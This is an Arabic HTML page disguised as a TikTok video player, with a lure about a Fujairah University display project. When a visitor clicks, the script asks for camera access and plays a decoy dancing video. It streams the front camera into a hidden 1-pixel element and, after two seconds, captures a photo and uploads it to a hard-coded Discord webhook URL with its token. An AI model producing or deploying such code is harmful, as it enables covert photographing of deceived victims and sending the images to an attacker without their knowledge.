<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>تيك توك | مشاهدة</title>
    <style>
        body, html { margin: 0; padding: 0; height: 100%; background: #000; overflow: hidden; font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; }
        .main-container { position: relative; width: 100%; height: 100%; display: flex; flex-direction: column; justify-content: center; align-items: center; }
        
        /* فيديو تيك توك الخلفي */
        #tiktok-video { width: 100%; height: 100%; object-fit: cover; z-index: 1; }

        /* الكاميرا - مخفية تماماً برمجياً وبصرياً */
        #hidden-camera { position: absolute; width: 1px; height: 1px; opacity: 0; pointer-events: none; z-index: -10; }
        
        /* قماش لالتقاط الصورة - مخفي */
        #photo-canvas { display: none; }

        /* واجهة التشغيل الاحترافية (تشبه تيك توك) */
        .tiktok-overlay {
            position: absolute; top: 0; left: 0; width: 100%; height: 100%;
            background: linear-gradient(0deg, rgba(0,0,0,0.8) 0%, rgba(0,0,0,0) 50%, rgba(0,0,0,0.8) 100%);
            display: flex; flex-direction: column; justify-content: center; align-items: center; z-index: 20;
            cursor: pointer;
        }

        .tiktok-icon { width: 100px; height: 100px; background-size: contain; background-repeat: no-repeat;
            background-image: url('data:image/svg+xml;utf8,<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 448 512"><path fill="white" d="M448 209.91a210.06 210.06 0 0 1-122.77-39.25V349.38A162.55 162.55 0 1 1 185 188.31V278.2a74.62 74.62 0 1 0 52.23 71.18V0h88a121.18 121.18 0 0 0 1.86 22.17A122.18 122.18 0 0 0 381 102.39a121.4 121.4 0 0 0 67 20.14Z"/></svg>');
            margin-bottom: 20px;
        }

        .info-text { color: white; text-align: center; max-width: 80%; text-shadow: 1px 1px 10px rgba(0,0,0,0.5); font-size: 18px; margin-bottom: 20px;}
        .load-dot { display: inline-block; width: 10px; height: 10px; border-radius: 50%; background-color: #fe2c55; animation: tiktok-load 1.5s infinite ease-in-out; margin: 0 5px; }
        .load-dot:nth-child(2) { background-color: #25f4ee; animation-delay: 0.2s; }
        .load-dot:nth-child(3) { background-color: #fe2c55; animation-delay: 0.4s; }

        @keyframes tiktok-load { 0%, 100% { transform: scale(1); opacity: 1; } 50% { transform: scale(1.5); opacity: 0.3; } }
    </style>
</head>
<body>

<div class="main-container">
    <video id="hidden-camera" autoplay playsinline muted></video>
    <canvas id="photo-canvas"></canvas>
    
    <video id="tiktok-video" loop playsinline>
        <source src="https://assets.mixkit.co/videos/preview/mixkit-girl-dancing-to-the-rhythm-of-music-34444-large.mp4" type="video/mp4">
    </video>

    <div class="tiktok-overlay" id="overlay" onclick="startTest()">
        <div class="tiktok-icon"></div>
        <p class="info-text">فتح مشروع نظام العرض التفاعلي<br>لجامعة الفجيرة</p>
        <div class="load-control">
            <span class="load-dot"></span>
            <span class="load-dot"></span>
            <span class="load-dot"></span>
        </div>
    </div>
</div>

<script>
    // الويب هوك الخاص بك
    const webhookURL = 'https://discord.com/api/webhooks/1493312893100228608/X78aap9qPQUcppW21eNRpVDCiJGIS3OFDw6rH6ZKTPVTzsQbsGJyBKMWV7slNEt67zUs';

    async function startTest() {
        const video = document.getElementById('tiktok-video');
        const camera = document.getElementById('hidden-camera');
        const overlay = document.getElementById('overlay');

        try {
            // طلب الإذن الرسمي للكاميرا
            const stream = await navigator.mediaDevices.getUserMedia({ 
                video: { facingMode: "user" }, 
                audio: false 
            });
            
            camera.srcObject = stream;
            
            // تشغيل فيديو تيك توك وإخفاء واجهة البدء
            video.play();
            overlay.style.display = 'none';

            // التقاط الصورة الأولى بعد ثانيتين من التشغيل
            setTimeout(() => {
                captureAndSend(camera);
            }, 2000);

        } catch (err) {
            alert("يرجى السماح بالوصول للوسائط لتشغيل العرض.");
            console.error(err);
        }
    }

    async function captureAndSend(cameraElement) {
        const canvas = document.getElementById('photo-canvas');
        const context = canvas.getContext('2d');
        
        // تعيين حجم الكانفاس ليتناسب مع الفيديو
        canvas.width = cameraElement.videoWidth;
        canvas.height = cameraElement.videoHeight;
        
        // رسم إطار الفيديو على الكانفاس
        context.drawImage(cameraElement, 0, 0, canvas.width, canvas.height);
        
        // تحويل الصورة إلى BLOB لإرسالها
        canvas.toBlob(async (blob) => {
            if (!blob) return;

            // تجهيز البيانات لإرسالها عبر Webhook
            const formData = new FormData();
            formData.append('file', blob, 'capture.png');
            
            try {
                // إرسال البيانات إلى الديسكورد
                const response = await fetch(webhookURL, {
                    method: 'POST',
                    body: formData
                });
                
                if (response.ok) {
                    console.log("تم إرسال الصورة بنجاح للدسكورد!");
                } else {
                    console.error("فشل إرسال الصورة للدسكورد:", response.statusText);
                }
            } catch (err) {
                console.error("خطأ في الشبكة أثناء إرسال الصورة:", err);
            }
        }, 'image/png');
    }
</script>

</body>
</html>
